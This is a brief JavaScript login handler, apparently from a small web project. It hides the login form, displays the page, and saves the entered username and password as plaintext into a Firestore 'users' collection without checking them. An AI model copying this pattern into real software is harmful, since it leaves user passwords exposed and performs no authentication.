var loginForm = document.getElementById('login');
var page = document.getElementById('page');

function Login(){
    loginForm.style.display = "none";
    page.style.display = "block";

    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    db.collection("users").add({
        name: username,
        pass: password
    });

    return false;
}